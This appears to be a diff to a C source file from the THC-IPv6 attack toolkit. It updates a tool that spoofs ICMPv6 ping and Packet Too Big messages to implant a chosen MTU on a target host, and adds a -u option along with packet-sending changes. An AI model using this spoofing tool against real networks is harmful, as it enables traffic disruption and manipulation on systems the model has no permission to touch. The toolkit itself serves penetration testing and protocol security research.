@@ -11,10 +11,11 @@
 #include "thc-ipv6.h"
 
 void help(char *prg) {
-  printf("%s %s (c) 2012 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s interface target-ip existing-ip mtu [hop-limit]\n\n", prg);
+  printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("Syntax: %s [-u] interface target-ip existing-ip mtu [hop-limit]\n\n", prg);
   printf("Implants the specified mtu on the target.\n");
   printf("If the TTL of the target is not 64, then specify this as the last option.\n");
+  printf("Option -u will send the TooBig without the spoofed ping6 from existing-ip.\n");
 //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
@@ -26,7 +27,13 @@ int main(int argc, char *argv[]) {
   int pkt_len = 0;
   thc_ipv6_hdr *ipv6;
   char *interface;
-  unsigned int mtu;
+  unsigned int mtu, related = 1;
+  
+  if (argc > 3 && strncmp(argv[1], "-u", 2) == 0) {
+    related = 0;
+    argc--;
+    argv++;
+  }
 
   if (argc < 5 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
@@ -56,18 +63,23 @@ int main(int argc, char *argv[]) {
   if (buf_len < 0)
     buf_len = rmtu - 48 - offset;
 
-  if (rmtu < buf_len + 48)
+  if (rmtu - 48 < buf_len )
     buf_len = rmtu - 48;
-
+    
   memset(buf, 'A', sizeof(buf));
   if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, src6, target6, 0, 0, 0, 0, 0)) == NULL)
     return -1;
   if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe, (unsigned char *) &buf, buf_len, 0) < 0)
     return -1;
-  if (thc_generate_and_send_pkt(interface, NULL, NULL, pkt, &pkt_len) < 0) {
-    fprintf(stderr, "Error: Can not send packet, exiting ...\n");
+  if (thc_generate_pkt(interface, NULL, NULL, pkt, &pkt_len) < 0) {
+    fprintf(stderr, "Error: Can not generate packet, exiting ...\n");
     exit(-1);
   }
+  if (related)
+    if (thc_send_pkt(interface, pkt, &pkt_len) < 0) {
+      fprintf(stderr, "Error: Can not send packet, exiting ...\n");
+      exit(-1);
+    }
 
   usleep(50000);
   ipv6 = (thc_ipv6_hdr *) pkt;
